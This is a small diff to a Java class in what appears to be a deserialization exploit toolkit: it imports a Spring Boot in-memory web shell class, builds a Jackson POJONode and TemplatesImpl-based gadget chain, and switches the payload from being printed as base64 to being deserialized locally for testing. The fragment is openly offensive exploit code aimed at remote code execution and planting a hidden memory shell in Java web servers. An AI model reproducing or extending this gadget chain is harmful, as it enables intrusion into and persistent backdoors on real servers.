@@ -1,5 +1,6 @@
 package gadget;
 
+import com.fasterxml.jackson.databind.introspect.POJOPropertiesCollector;
 import gadget.memshell.SpringBootMemoryShellOfController;
 import javassist.*;
 import com.fasterxml.jackson.databind.node.POJONode;
@@ -38,8 +39,8 @@ public class Jackson {
 //        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
 //        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
 //        oos.writeObject(val);
-//        SerializerUtils.unserialize(SerializerUtils.serialize(val));
-        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(val)));
+        SerializerUtils.unserialize(SerializerUtils.serialize(val));
+//        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(val)));
     }
 
     public static Object makeTemplatesImplAopProxy() throws Exception {
